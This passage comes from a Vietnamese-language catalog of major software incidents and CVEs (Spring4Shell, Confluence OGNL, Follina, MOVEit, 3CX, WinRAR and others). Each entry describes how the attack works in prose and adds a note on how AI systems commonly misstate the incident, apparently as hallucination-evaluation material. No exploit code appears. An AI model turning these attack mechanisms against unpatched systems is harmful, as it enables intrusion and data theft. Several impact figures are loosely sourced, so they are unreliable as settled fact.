- **Nguyên nhân gốc rễ (Root Cause):** Thiết kế tính năng cho phép thực thi mã động qua giao thức mạng ngoài theo mặc định mà không lọc dữ liệu đầu vào.
- **Giải pháp (Solution):** Apache phát hành bản vá khẩn cấp Log4j 2.15.0, sau đó là 2.16.0 và 2.17.1 vô hiệu hóa hoàn toàn JNDI theo mặc định và loại bỏ hỗ trợ message lookups.
- **Tình trạng:** Đã vá (2022). Tuy nhiên các hệ thống cũ chưa nâng cấp vẫn tiếp tục bị tấn công.
- **AI Bias / Hallucination Analysis:**
  - **Phân loại:** Unsupported Claim / Understatement
  - **Phân tích:** AI thường tuyên bố rằng Log4Shell "đã được xử lý triệt để ngay sau khi phát hành bản vá vào tháng 12/2021", phủ nhận thực tế các báo cáo an ninh mạng năm 2022–2023 cho thấy hàng chục ngàn máy chủ doanh nghiệp vẫn tiếp tục bị khai thác do chu kỳ vá lỗi trong các hệ sinh thái phần mềm kế thừa (legacy software) diễn ra vô cùng chậm chạp.

---

### DEFECT-08 — Spring Framework Remote Code Execution (Spring4Shell - CVE-2022-22965)
- **Phần mềm / Sản phẩm:** Spring Framework (Spring MVC & Spring WebFlux)
- **Phiên bản:** Spring Framework 5.3.0 đến 5.3.17, 5.2.0 đến 5.2.19
- **Ngày công bố:** 31/03/2022
- **Nguồn:** VMware Spring Security Advisory / NVD
- **URL:** [https://nvd.nist.gov/vuln/detail/CVE-2022-22965](https://nvd.nist.gov/vuln/detail/CVE-2022-22965)
- **Phân loại:** Security Vulnerability / Remote Code Execution
- **Mức độ nghiêm trọng:** Critical
- **Lý do mức độ:** Điểm CVSS 9.8; lỗ hổng RCE không cần xác thực nhắm vào framework ứng dụng web phổ biến nhất thế giới trong hệ sinh thái Java.
- **Mô tả sự cố:** Cơ chế ràng buộc dữ liệu (Data Binding) trong Spring MVC cho phép người dùng ánh xạ các tham số HTTP request trực tiếp vào các thuộc tính của Java object. Khi chạy trên JDK 9+ với máy chủ Tomcat (đóng gói dưới dạng file WAR truyền thống), kẻ tấn công có thể thông qua class loader để ghi đè cấu hình ghi log của Tomcat, từ đó tạo ra một file Webshell (JSP) độc hại trên máy chủ để thực thi lệnh từ xa.
- **Hậu quả:** Hàng ngàn ứng dụng ngân hàng, thương mại điện tử chạy nền tảng Spring bị nhắm mục tiêu tấn công ngay trong những giờ đầu tiên công bố mã khai thác (PoC).
- **Phạm vi ảnh hưởng:** Các ứng dụng Spring MVC/WebFlux chạy trên JDK 9 trở lên đóng gói dưới dạng Tomcat WAR.
- **Nguyên nhân gốc rễ (Root Cause):** Quá trình lọc các thuộc tính Class Loader trong cơ chế JavaBean Data Binding của Spring bị hở khi Java nâng cấp lên module system ở JDK 9.
- **Giải pháp (Solution):** Nâng cấp lên Spring Framework phiên bản 5.3.18 hoặc 5.2.20; áp dụng quy tắc chặn tham số `class.*` trên Web Application Firewall (WAF).
- **Tình trạng:** Đã vá (Tháng 04/2022).
- **AI Bias / Hallucination Analysis:**
  - **Phân loại:** Hallucination / Conflation
  - **Phân tích:** AI rất hay bị ảo giác nhầm lẫn giữa Spring4Shell và Log4Shell, khẳng định rằng Spring4Shell là "lỗi ghi log bằng JNDI", trong khi thực tế lỗ hổng này hoàn toàn nằm ở tầng Data Binding và Class Loader reflection của framework ứng dụng web.

---

### DEFECT-09 — Atlassian Confluence Server OGNL Injection (CVE-2022-26134)
- **Phần mềm / Sản phẩm:** Atlassian Confluence Server & Data Center
- **Phiên bản:** Mọi phiên bản trước 7.4.17, 7.13.7, 7.14.3, 7.15.2, 7.16.4, 7.17.4, 7.18.1
- **Ngày công bố:** 03/06/2022
- **Nguồn:** Atlassian Security Advisory / Volexity Research
- **URL:** [https://nvd.nist.gov/vuln/detail/CVE-2022-26134](https://nvd.nist.gov/vuln/detail/CVE-2022-26134)
- **Phân loại:** Security Vulnerability / OGNL Injection / RCE
- **Mức độ nghiêm trọng:** Critical
- **Lý do mức độ:** Điểm CVSS 9.8; bị khai thác zero-day trong thực tế trước khi hãng kịp phát hành bản vá; cho phép chiếm quyền máy chủ mà không cần đăng nhập.
- **Mô tả sự cố:** Một lỗ hổng chèn biểu thức OGNL (Object-Graph Navigation Language) trong URL của Confluence cho phép kẻ tấn công gửi một HTTP GET request chứa mã OGNL độc hại trong đường dẫn URI. Khi máy chủ Confluence xử lý trang chuyển hướng hoặc lỗi, biểu thức này được thực thi trực tiếp dưới quyền của tài khoản chạy dịch vụ.
- **Hậu quả:** Hàng ngàn máy chủ tài liệu nội bộ của các tập đoàn công nghệ lớn bị cài đặt Webshell, đánh cắp mã nguồn và triển khai mã độc mã hóa dữ liệu.
- **Phạm vi ảnh hưởng:** Hàng chục ngàn doanh nghiệp triển khai Confluence On-premise trên toàn cầu.
- **Nguyên nhân gốc rễ (Root Cause):** Thiếu cơ chế kiểm tra và làm sạch (sanitization) chuỗi URI trước khi truyền vào engine xử lý biểu thức OGNL.
- **Giải pháp (Solution):** Nâng cấp khẩn cấp các phiên bản vá lỗi của Atlassian; tạm thời chặn các request chứa ký tự đặc biệt bằng WAF.
- **Tình trạng:** Đã vá (Tháng 06/2022).
- **AI Bias / Hallucination Analysis:**
  - **Phân loại:** Omission of Zero-Day Window
  - **Phân tích:** Khi được hỏi, AI thường bỏ qua chi tiết quan trọng rằng lỗ hổng này đã bị các nhóm tin tặc khai thác bí mật trên diện rộng từ trước khi Atlassian nhận được báo cáo (zero-day exploitation), làm cho người đọc đánh giá sai mức độ khẩn cấp và độ trễ trong quy trình phản ứng sự cố của hãng.

---

### DEFECT-10 — Microsoft Windows MSDT "Follina" Zero-Day (CVE-2022-30190)
- **Phần mềm / Sản phẩm:** Microsoft Windows Support Diagnostic Tool (MSDT) / Microsoft Office
- **Phiên bản:** Windows 7 đến Windows 11, Windows Server 2008 đến 2022
- **Ngày công bố:** 30/05/2022
- **Nguồn:** Microsoft Security Advisory / NVD
- **URL:** [https://nvd.nist.gov/vuln/detail/CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)
- **Phân loại:** Security Vulnerability / Zero-Day RCE
- **Mức độ nghiêm trọng:** High
- **Lý do mức độ:** Điểm CVSS 7.8; cho phép thực thi mã từ xa qua file Word độc hại mà không cần nạn nhân phải bật macro (macro-less exploit).
- **Mô tả sự cố:** Kẻ tấn công tạo một file tài liệu Microsoft Word có chứa liên kết tải template HTML độc hại từ xa. Trang HTML này sử dụng giao thức URL đặc biệt `ms-msdt:` để kích hoạt công cụ chẩn đoán hệ thống Windows (MSDT), truyền các tham số tùy ý để thực thi mã lệnh PowerShell độc hại ngay cả khi tính năng Macros đã bị vô hiệu hóa hoàn toàn.
- **Hậu quả:** Được các nhóm tin tặc có bảo trợ quốc gia sử dụng để tấn công có chủ đích vào các cơ quan chính phủ, quân sự và tổ chức báo chí quốc tế.
- **Phạm vi ảnh hưởng:** Mọi người dùng máy tính chạy Windows có cài đặt bộ ứng dụng văn phòng Microsoft Office.
- **Nguyên nhân gốc rễ (Root Cause):** Trình xử lý giao thức (protocol handler) của MSDT không kiểm tra tính hợp lệ của tham số lệnh khi được gọi từ các ứng dụng bên ngoài như Word.
- **Giải pháp (Solution):** Microsoft phát hành bản vá trong đợt Patch Tuesday tháng 06/2022; giải pháp tình thế là vô hiệu hóa giao thức URL `ms-msdt` trong Windows Registry.
- **Tình trạng:** Đã vá (Tháng 06/2022).
- **AI Bias / Hallucination Analysis:**
  - **Phân loại:** Hallucination on Macro Requirement
  - **Phân tích:** AI giải thích sự cố này thường nói nhầm rằng "người dùng bị lừa bật nút Enable Macros trong Word mới bị nhiễm", ảo giác sang cơ chế tấn công VBA Macro cổ điển, trong khi điểm nguy hiểm nhất làm nên tên tuổi của Follina chính là khả năng thực thi mã mà KHÔNG CẦN bật macro.

---

### DEFECT-11 — OpenAI ChatGPT & Developer API Global Outage (11/12/2024)
- **Phần mềm / Sản phẩm:** OpenAI ChatGPT / Sora / Developer API
- **Phiên bản:** ChatGPT Platform (11/12/2024)
- **Ngày công bố:** 11/12/2024
- **Nguồn:** Trang trạng thái OpenAI Status / Báo cáo BusinessABC
- **URL:** [https://businessabc.net/5-mega-software-disasters-of-2024](https://businessabc.net/5-mega-software-disasters-of-2024)
- **Phân loại:** Service Outage / Infrastructure Misconfiguration
- **Mức độ nghiêm trọng:** High
- **Lý do mức độ:** Làm gián đoạn dịch vụ ChatGPT, mô hình tạo video Sora và toàn bộ API dành cho lập trình viên trên toàn cầu trong hơn 4 giờ liên tục; ảnh hưởng đến hàng trăm triệu người dùng và các doanh nghiệp tích hợp AI.
- **Mô tả sự cố:** Vào ngày 11/12/2024, một bản cập nhật cấu hình hạ tầng mạng nội bộ được đẩy lên môi trường production đã khiến hàng loạt cụm máy chủ xử lý suy luận (inference servers) của OpenAI mất kết nối và không thể định tuyến request, gây ra lỗi HTTP 503/500 trên quy mô toàn cầu.
- **Hậu quả:** Hàng triệu nhân viên văn phòng và lập trình viên bị đình trệ công việc; hàng ngàn ứng dụng bên thứ ba (SaaS) tích hợp OpenAI API bị tê liệt tính năng AI; CEO Sam Altman phải công khai xin lỗi trên mạng xã hội X.
- **Phạm vi ảnh hưởng:** Toàn bộ người dùng cá nhân và doanh nghiệp sử dụng ChatGPT và OpenAI API.
- **Nguyên nhân gốc rễ (Root Cause):** Lỗi cấu hình triển khai đồng loạt (misconfiguration) thiếu quy trình kiểm thử rollback tự động trên cụm hạ tầng đám mây.
- **Giải pháp (Solution):** Rollback bản cấu hình mạng về trạng thái ổn định trước đó, khởi động lại các cụm gateway và bổ sung các chốt kiểm định an toàn khi cập nhật hạ tầng.
- **Tình trạng:** Khắc phục xong sau 4 giờ gián đoạn.
- **AI Bias / Hallucination Analysis:**
  - **Phân loại:** Omission of Systemic Downtime Trends
  - **Phân tích:** Khi phân tích sự cố này, AI thường coi đây là "một sự cố hy hữu đơn lẻ do sự cố mạng thông thường", bỏ qua bức tranh toàn cảnh rằng trong suốt năm 2024 OpenAI đã gặp phải nhiều đợt gián đoạn dịch vụ nghiêm trọng do hạ tầng mở rộng quy mô quá nhanh mà thiếu các bài test tải và test chịu lỗi đồng bộ.

---

### DEFECT-12 — Khủng hoảng phần mềm xe điện Volkswagen ID Series (2022–2024)
- **Phần mềm / Sản phẩm:** Hệ thống phần mềm điều khiển xe điện Volkswagen (Cariad Platform)
- **Phiên bản:** Xe điện Volkswagen ID.3, ID.4 (2022–2024)
- **Ngày công bố:** Giai đoạn 2022–2024
- **Nguồn:** Medium / JavaRevisited / Báo cáo tài chính Volkswagen AG
- **URL:** [https://medium.com/javarevisited/the-biggest-software-failures-of-2024-8e9413350f4c](https://medium.com/javarevisited/the-biggest-software-failures-of-2024-8e9413350f4c)
- **Phân loại:** Automotive Software Defect / Embedded Quality Control Failure
- **Mức độ nghiêm trọng:** Critical
- **Lý do mức độ:** Làm phát sinh chi phí tái cấu trúc và triệu hồi xe lên tới hơn 5 tỷ USD; trì hoãn lịch ra mắt các dòng xe điện cao cấp của Audi và Porsche; ảnh hưởng trực tiếp đến an toàn vận hành của xe.
- **Mô tả sự cố:** Hệ điều hành trên các dòng xe điện ID của Volkswagen liên tục gặp lỗi phần mềm nghiêm trọng: màn hình điều khiển trung tâm bị đóng băng khi đang lái xe, hệ thống ước tính dung lượng pin và quãng đường di chuyển hiển thị sai lệch, và hệ thống hỗ trợ lái nâng cao (ADAS) phát cảnh báo ảo hoặc tự động phanh bất thường.
- **Hậu quả:** Volkswagen phải triệu hồi hàng trăm ngàn xe để cập nhật phần mềm tại đại lý; ban lãnh đạo công ty con chuyên phát triển phần mềm (Cariad) bị sa thải toàn bộ; mất thị phần xe điện vào tay Tesla và các hãng xe Trung Quốc.
- **Phạm vi ảnh hưởng:** Hàng trăm ngàn chủ sở hữu xe Volkswagen ID.3 và ID.4 trên thế giới.
- **Nguyên nhân gốc rễ (Root Cause):** Khủng hoảng kiểm thử phần mềm nhúng (Embedded QA): Chiến lược chuyển đổi sang kiến trúc xe định nghĩa bằng phần mềm (Software-Defined Vehicle) quá nóng vội trong khi quy trình kiểm thử tích hợp phần mềm - phần cứng (HIL Testing) phân mảnh và lạc hậu.
- **Giải pháp (Solution):** Phát hành các bản cập nhật phần mềm qua mạng (OTA) và tại xưởng; tái cơ cấu tổ chức bộ phận phần mềm Cariad và ký hợp đồng hợp tác chiến lược với hãng xe điện Rivian để dùng chung kiến trúc phần mềm mới.
- **Tình trạng:** Khắc phục từng phần qua các đợt cập nhật (2024).
- **AI Bias / Hallucination Analysis:**
  - **Phân loại:** Unsupported Claim / Root Cause Shift
  - **Phân tích:** AI khi phân tích lỗi này thường đưa ra nhận định sai lầm rằng Volkswagen bị "tin tặc tấn công mạng vào hệ thống xe", thay vì chỉ ra đúng nguyên nhân gốc rễ là sự thất bại trong quy trình đảm bảo chất lượng phần mềm nội bộ (QA/QC failure) và sự thiếu hụt năng lực kiểm thử tích hợp hệ thống nhúng.

---

### DEFECT-13 — Google Chrome Use-After-Free in Animation (CVE-2022-0609)
- **Phần mềm / Sản phẩm:** Trình duyệt Google Chrome
- **Phiên bản:** Chrome trước phiên bản 98.0.4758.102
- **Ngày công bố:** 14/02/2022
- **Nguồn:** Google Chrome Security Advisory / NVD
- **URL:** [https://nvd.nist.gov/vuln/detail/CVE-2022-0609](https://nvd.nist.gov/vuln/detail/CVE-2022-0609)
- **Phân loại:** Security Vulnerability / Use-After-Free / Zero-Day
- **Mức độ nghiêm trọng:** High
- **Lý do mức độ:** Điểm CVSS 8.8; bị các nhóm tin tặc có liên hệ với chính phủ khai thác trên thực tế (in-the-wild zero-day) để chiếm quyền điều khiển máy tính người dùng.
- **Mô tả sự cố:** Một lỗi giải phóng vùng nhớ không hợp lệ (Use-After-Free) xảy ra trong thành phần xử lý hiệu ứng hoạt họa (Animation component) của trình duyệt Chrome. Kẻ tấn công tạo một trang web chứa mã HTML/JavaScript độc hại thao tác với các đối tượng đồ họa; khi bộ nhớ của đối tượng bị giải phóng nhưng con trỏ vẫn còn truy cập, kẻ tấn công có thể chèn mã độc để thực thi tùy ý trong sandbox của trình duyệt.
- **Hậu quả:** Được sử dụng trong các chiến dịch tấn công APT nhắm vào các tổ chức tài chính, truyền thông và công nghệ trước khi Google kịp vá lỗi.
- **Phạm vi ảnh hưởng:** Hàng tỷ người dùng Chrome trên Windows, macOS và Linux.
- **Nguyên nhân gốc rễ (Root Cause):** Quản lý vòng đời bộ nhớ con trỏ không an toàn trong mã nguồn C++ của engine render hoạt họa.
- **Giải pháp (Solution):** Google phát hành bản cập nhật khẩn cấp Chrome 98.0.4758.102 tự động đẩy xuống máy người dùng.
- **Tình trạng:** Đã vá (Tháng 02/2022).
- **AI Bias / Hallucination Analysis:**
  - **Phân loại:** Hallucination of Affected Component (V8)
  - **Phân tích:** AI thường xuyên bị ảo giác khẳng định lỗ hổng này nằm ở "engine biên dịch JavaScript V8", do V8 là thành phần thường xuyên dính lỗi nhất của Chrome. Việc gán bừa vào V8 cho thấy AI suy đoán theo xác suất từ ngữ thay vì tra cứu đúng thành phần bị lỗi là module Animation.

---

### DEFECT-14 — Apple WebKit Use-After-Free Zero-Day (CVE-2022-22620)
- **Phần mềm / Sản phẩm:** Apple WebKit (Safari, iOS, macOS)
- **Phiên bản:** iOS trước 15.3.1, iPadOS trước 15.3.1, macOS Monterey trước 12.2.1
- **Ngày công bố:** 10/02/2022
- **Nguồn:** Apple Security Advisory / NVD
- **URL:** [https://nvd.nist.gov/vuln/detail/CVE-2022-22620](https://nvd.nist.gov/vuln/detail/CVE-2022-22620)
- **Phân loại:** Security Vulnerability / Use-After-Free / Zero-Day
- **Mức độ nghiêm trọng:** Critical
- **Lý do mức độ:** Khai thác zero-day thực tế được Apple chính thức xác nhận; cho phép chiếm quyền kiểm soát thiết bị chỉ bằng cách lừa người dùng mở một trang web độc hại.
- **Mô tả sự cố:** Lỗi Use-After-Free xảy ra trong engine WebKit của Apple khi phân tích cú pháp và hiển thị nội dung web. Khi xử lý các thành phần DOM động, vùng nhớ bị thu hồi nhưng không được xóa tham chiếu, cho phép trang web độc hại thực thi mã tùy ý với quyền hạn của ứng dụng duyệt web.
- **Hậu quả:** Được khai thác bởi các phần mềm gián điệp thương mại (spyware) nhắm vào các nhà báo, chính trị gia và nhà hoạt động nhân quyền.
- **Phạm vi ảnh hưởng:** Toàn bộ người dùng iPhone, iPad và máy tính Mac sử dụng Safari hoặc bất kỳ trình duyệt nào trên iOS.
- **Nguyên nhân gốc rễ (Root Cause):** Khiếm khuyết trong quản lý bộ nhớ đối tượng DOM của engine WebKit trong C++.
- **Giải pháp (Solution):** Apple phát hành bản cập nhật khẩn cấp iOS 15.3.1 và macOS 12.2.1 để quản lý lại vòng đời con trỏ bộ nhớ.
- **Tình trạng:** Đã vá (Tháng 02/2022).
- **AI Bias / Hallucination Analysis:**
  - **Phân loại:** Omission of Impact on All iOS Browsers
  - **Phân tích:** AI thường giải thích rằng lỗi này "chỉ ảnh hưởng đến trình duyệt Safari", bỏ sót một quy tắc cốt lõi của Apple: trên hệ điều hành iOS, mọi trình duyệt bên thứ ba (như Chrome, Firefox, Edge) đều bắt buộc phải dùng engine WebKit của Apple, do đó toàn bộ người dùng duyệt web trên iOS đều bị ảnh hưởng chứ không riêng gì người dùng Safari.

---

### DEFECT-15 — Twitter / X Platform API Scraping & 200M User Data Leak
- **Phần mềm / Sản phẩm:** Nền tảng Twitter / X API
- **Phiên bản:** Twitter REST API (Lỗ hổng từ 01/2022, rò rỉ cơ sở dữ liệu 01/2023)
- **Ngày công bố:** Tháng 01/2022 (Công bố rò rỉ dữ liệu rộng rãi vào 01/2023)
- **Nguồn:** Báo cáo HaveIBeenPwned / BleepingComputer
- **URL:** [https://haveibeenpwned.com/PwnedWebsites](https://haveibeenpwned.com/PwnedWebsites)
- **Phân loại:** API Security Defect / Mass Data Enumeration
- **Mức độ nghiêm trọng:** High
- **Lý do mức độ:** Làm lộ địa chỉ email cá nhân gắn liền với hơn 200 triệu tài khoản Twitter công khai và ẩn danh trên toàn cầu.
- **Mô tả sự cố:** Một sự cố cập nhật mã nguồn API vào tháng 06/2021 đã tạo ra lỗ hổng cho phép kẻ tấn công gửi một danh sách địa chỉ email hoặc số điện thoại bất kỳ lên endpoint API để kiểm tra xem tài khoản Twitter nào đang liên kết với thông tin đó mà không bị giới hạn tần suất (lack of rate limiting). Tin tặc đã cào dữ liệu hơn 200 triệu tài khoản và tung lên các diễn đàn ngầm vào tháng 01/2023.
- **Hậu quả:** 200 triệu người dùng bị đe dọa bởi các chiến dịch lừa đảo giả mạo (phishing), tống tiền và bị hủy bỏ tính ẩn danh (deanonymization) đối với các tài khoản nhạy cảm chính trị.
- **Phạm vi ảnh hưởng:** Hơn 200 triệu người dùng nền tảng Twitter/X.
- **Nguyên nhân gốc rễ (Root Cause):** Kiểm thử hồi quy API bị thiếu sót khi tích hợp mã mới, loại bỏ mất cơ chế kiểm tra quyền truy cập và giới hạn tốc độ truy vấn (rate limiting).
- **Giải pháp (Solution):** Twitter vá lỗ hổng API vào tháng 01/2022 nhưng không thể thu hồi cơ sở dữ liệu đã bị cào trước đó; phát đi cảnh báo an toàn tới người dùng.
- **Tình trạng:** Đã vá lỗ hổng API (01/2022); dữ liệu bị rò rỉ vẫn lưu hành trên mạng.
- **AI Bias / Hallucination Analysis:**
  - **Phân loại:** Unsupported Claim / Causal Fallacy
  - **Phân tích:** Rất nhiều chatbot AI khẳng định sai lầm rằng vụ lộ dữ liệu này là do "sự xáo trộn chính sách an ninh sau khi tỷ phú Elon Musk tiếp quản Twitter", trong khi sự thật kỹ thuật chứng minh lỗ hổng đã phát sinh từ giữa năm 2021 và đã bị khai thác trước thời điểm thương vụ mua lại diễn ra gần một năm.

---

### DEFECT-16 — MOVEit Transfer SQL Injection Mass Data Extortion (CVE-2023-34362)
- **Phần mềm / Sản phẩm:** MOVEit Transfer (Progress Software)
- **Phiên bản:** Mọi phiên bản MOVEit Transfer trước 2023.0.1
- **Ngày công bố:** 31/05/2023
- **Nguồn:** Progress Software Advisory / NVD / CISA Alert
- **URL:** [https://nvd.nist.gov/vuln/detail/CVE-2023-34362](https://nvd.nist.gov/vuln/detail/CVE-2023-34362)
- **Phân loại:** Security Vulnerability / SQL Injection / Supply Chain Extortion
- **Mức độ nghiêm trọng:** Critical
- **Lý do mức độ:** Điểm CVSS 9.8; dẫn đến chiến dịch tống tiền dữ liệu lớn nhất năm 2023, ảnh hưởng hơn 2,700 tổ chức và hơn 90 triệu cá nhân.
- **Mô tả sự cố:** Một lỗ hổng SQL Injection nghiêm trọng trong ứng dụng web MOVEit Transfer cho phép kẻ tấn công chưa xác thực gửi các câu lệnh SQL độc hại thông qua giao diện web để leo thang đặc quyền, chèn Webshell (tên mã LEMURLOOT) và tải trọn vẹn cơ sở dữ liệu tệp tin nội bộ của các cơ quan chính phủ và doanh nghiệp.
- **Hậu quả:** Nhóm tội phạm mạng Cl0p đã đánh cắp dữ liệu của hàng loạt cơ quan liên bang Mỹ (Bộ Năng lượng, CISA), BBC, British Airways, hãng hàng không Mỹ và hàng trăm trường đại học; thiệt hại kinh tế ước tính hàng tỷ USD.
- **Phạm vi ảnh hưởng:** Hơn 2,700 tổ chức trên toàn cầu sử dụng phần mềm truyền tệp an toàn MOVEit Transfer.
- **Nguyên nhân gốc rễ (Root Cause):** Sử dụng các câu truy vấn SQL ghép chuỗi không tham số hóa (unparameterized SQL queries) trong module xử lý web.
- **Giải pháp (Solution):** Progress Software phát hành khẩn cấp các bản vá; CISA ban hành chỉ thị khẩn cấp yêu cầu toàn bộ cơ quan chính phủ ngắt kết nối hệ thống và rà quét mã độc.
- **Tình trạng:** Đã vá (Tháng 06/2023). Các vụ kiện tập thể vẫn đang tiếp diễn.
- **AI Bias / Hallucination Analysis:**
  - **Phân loại:** Unsupported Claim / Ransomware Fallacy
  - **Phân tích:** AI giải thích sự cố này thường nói theo khuôn mẫu rằng "MOVEit bị tấn công mã hóa dữ liệu đòi tiền chuộc (Ransomware)", nhưng thực chất nhóm tin tặc Cl0p không hề mã hóa bất kỳ file nào mà chỉ trích xuất dữ liệu (Data Exfiltration) để tống tiền — một sự nhầm lẫn bản chất chiến thuật tấn công rất phổ biến của AI.

---

### DEFECT-17 — 3CX Desktop App Supply Chain Trojanization (CVE-2023-29059)
- **Phần mềm / Sản phẩm:** 3CX Desktop App (Ứng dụng liên lạc doanh nghiệp)
- **Phiên bản:** Phiên bản Windows 18.12.407/416 và macOS 18.11.1213/1214
- **Ngày công bố:** 29/03/2023
- **Nguồn:** Báo cáo điều tra của CrowdStrike & Mandiant / NVD
- **URL:** [https://nvd.nist.gov/vuln/detail/CVE-2023-29059](https://nvd.nist.gov/vuln/detail/CVE-2023-29059)
- **Phân loại:** Supply Chain Security Defect / Malware Sideloading
- **Mức độ nghiêm trọng:** Critical
- **Lý do mức độ:** Bộ cài đặt phần mềm chính thức có chữ ký số hợp lệ của hãng phát hành bị chèn mã độc, phát tán tới hơn 600,000 tổ chức khách hàng tại 190 quốc gia.
- **Mô tả sự cố:** Nhóm tin tặc Lazarus (Triều Tiên) đã xâm nhập vào chuỗi cung ứng phần mềm (build pipeline) của công ty 3CX, chèn mã độc vào hai thư viện DLL hợp lệ (`ffmpeg.dll` và `d3dcompiler_47.dll`) được đóng gói trong trình cài đặt chính thức của ứng dụng 3CX Desktop App. Khi người dùng cài đặt, ứng dụng kích hoạt kỹ thuật DLL Sideloading để tải mã độc thứ cấp đánh cắp thông tin tài chính và tiền điện tử.
- **Hậu quả:** Hàng ngàn công ty viễn thông, ngân hàng và sàn giao dịch tiền mã hóa bị cài cắm mã độc ngầm ngay từ bộ cài đặt chính thức được tin cậy.
- **Phạm vi ảnh hưởng:** Hơn 600,000 công ty sử dụng hệ thống tổng đài điện thoại VoIP của 3CX.
- **Nguyên nhân gốc rễ (Root Cause):** Môi trường phát triển và ký số phần mềm (build server) của 3CX bị xâm phạm thông qua máy tính cá nhân của một kỹ sư bị nhiễm mã độc từ một gói npm trojan trước đó.
- **Giải pháp (Solution):** 3CX thu hồi chứng chỉ số bị xâm phạm, phát hành phiên bản sạch và khuyến cáo khách hàng chuyển sang sử dụng ứng dụng nền web (PWA).
- **Tình trạng:** Đã khắc phục (Tháng 04/2023).
- **AI Bias / Hallucination Analysis:**
  - **Phân loại:** Hallucination of Phishing Delivery Vector
  - **Phân tích:** AI thường ảo giác mô tả vụ việc như một "chiến dịch tấn công lừa đảo qua email (phishing) gửi link độc hại cho nhân viên cài đặt", làm lu mờ hoàn toàn tính chất cực kỳ tinh vi của một cuộc tấn công chuỗi cung ứng (Supply Chain Attack) nơi mã độc nằm ngay trong bản cập nhật chính thức có chữ ký số hợp lệ.

---

### DEFECT-18 — Lỗ hổng rò rỉ token hỗ trợ khách hàng của Okta Identity Platform
- **Phần mềm / Sản phẩm:** Hệ thống hỗ trợ khách hàng Okta Support Management System
- **Phiên bản:** Okta Support Case System (Tháng 10/2023)
- **Ngày công bố:** 19/10/2023
- **Nguồn:** Thông cáo bảo mật chính thức của Okta / BleepingComputer
- **URL:** [https://sec.okta.com/articles/2023/10/security-incident-disclosure](https://sec.okta.com/articles/2023/10/security-incident-disclosure)
- **Phân loại:** Security Breach / Session Hijacking / Third-Party Credential Leak
- **Mức độ nghiêm trọng:** High
- **Lý do mức độ:** Làm lộ các tệp HAR (HTTP Archive) chứa token phiên làm việc của các khách hàng lớn; các công ty bảo mật hàng đầu như Cloudflare, 1Password và BeyondTrust bị nhắm mục tiêu tấn công ngay sau đó.
- **Mô tả sự cố:** Kẻ tấn công đã chiếm quyền điều khiển tài khoản Google cá nhân của một nhân viên hỗ trợ Okta (tài khoản này được đăng nhập trên trình duyệt máy tính công ty có lưu mật khẩu hệ thống hỗ trợ). Từ đó, tin tặc trích xuất các tệp HAR do khách hàng đính kèm khi yêu cầu hỗ trợ lỗi; các tệp này chứa các token phiên đăng nhập (session cookies) chưa hết hạn, cho phép kẻ tấn công mạo danh quản trị viên của các khách hàng lớn.
- **Hậu quả:** Các khách hàng như Cloudflare và BeyondTrust phát hiện các nỗ lực xâm nhập trái phép vào hệ thống nội bộ thông qua session token bị rò rỉ; giá trị vốn hóa của Okta sụt giảm hơn 2 tỷ USD.
- **Phạm vi ảnh hưởng:** Toàn bộ khách hàng sử dụng cổng hỗ trợ của Okta gửi kèm file HAR.
- **Nguyên nhân gốc rễ (Root Cause):** Không thực hiện lọc bỏ dữ liệu nhạy cảm (sanitization) trong các tệp HAR tải lên và chính sách bảo mật cho phép dùng tài khoản cá nhân trên thiết bị doanh nghiệp.
- **Giải pháp (Solution):** Hủy toàn bộ session token bị lộ, chặn lưu trữ cookie nhạy cảm trong hệ thống case, và cấm triệt để việc đồng bộ tài khoản cá nhân trên thiết bị làm việc.
- **Tình trạng:** Đã xử lý (Cuối tháng 10/2023).
- **AI Bias / Hallucination Analysis:**
  - **Phân loại:** Omission of Scope Minimization
  - **Phân tích:** AI khi tóm tắt sự cố này thường bỏ qua một thực tế tai hại về truyền thông: ban đầu Okta tuyên bố chỉ có dưới 1% khách hàng bị ảnh hưởng, nhưng vài tuần sau đó phải thừa nhận là 100% dữ liệu của người dùng hệ thống hỗ trợ đã bị tải về. AI có xu hướng trích dẫn thông cáo giảm nhẹ ban đầu thay vì số liệu thực tế được đính chính sau cuộc điều tra.

---

### DEFECT-19 — WinRAR Archive File Extension Spoofing Code Execution (CVE-2023-38831)
- **Phần mềm / Sản phẩm:** Phần mềm nén WinRAR
- **Phiên bản:** Mọi phiên bản WinRAR trước 6.23
- **Ngày công bố:** 23/08/2023
- **Nguồn:** Group-IB Threat Intelligence / NVD
- **URL:** [https://nvd.nist.gov/vuln/detail/CVE-2023-38831](https://nvd.nist.gov/vuln/detail/CVE-2023-38831)
- **Phân loại:** Security Vulnerability / Arbitrary Code Execution / Logic Flaw
- **Mức độ nghiêm trọng:** High
- **Lý do mức độ:** Điểm CVSS 7.8; bị khai thác bí mật trên thực tế suốt hơn 4 tháng nhắm vào các nhà đầu tư tài chính và sàn chứng khoán trước khi có bản vá.
- **Mô tả sự cố:** Lỗi logic trong quá trình xử lý cấu trúc tệp nén ZIP của WinRAR: Khi một tệp nén chứa đồng thời một tệp hình ảnh/tài liệu lành tính (ví dụ `strategy.pdf`) và một thư mục trùng tên chứa tệp thực thi độc hại (ví dụ `strategy.pdf \strategy.pdf.cmd`), người dùng nhấp đúp vào tệp PDF thì WinRAR lại thực thi ngầm tệp script trong thư mục thay vì mở tệp tài liệu.
- **Hậu quả:** Hàng ngàn nhà đầu tư chứng khoán và tiền tệ bị đánh cắp tài khoản giao dịch khi tải các tài liệu phân tích thị trường giả mạo; ảnh hưởng tới hơn 500 triệu người dùng WinRAR.
- **Phạm vi ảnh hưởng:** Toàn bộ người dùng WinRAR trên hệ điều hành Windows trước phiên bản 6.23.
- **Nguyên nhân gốc rễ (Root Cause):** Thuật toán giải nén tạm thời và so khớp đường dẫn tệp của WinRAR bị nhầm lẫn giữa tên tệp đơn lẻ và tên thư mục chứa khoảng trắng ở cuối.
- **Giải pháp (Solution):** RARLAB phát hành bản cập nhật WinRAR 6.23 sửa lỗi logic kiểm tra phần mở rộng tệp.
- **Tình trạng:** Đã vá (Tháng 08/2023).
- **AI Bias / Hallucination Analysis:**
  - **Phân loại:** Unsupported Claim of Extraction Requirement
  - **Phân tích:** AI thường nói rằng "người dùng phải giải nén toàn bộ tệp ra ổ đĩa rồi bấm vào file thực thi mới bị dính lỗi", ảo giác sang quy trình lây nhiễm thông thường. Thực tế, điểm tinh vi và chết người của CVE-2023-38831 là mã độc tự chạy ngay khi người dùng chỉ bấm xem trước (preview) tệp PDF lành tính ngay bên trong cửa sổ WinRAR.

---

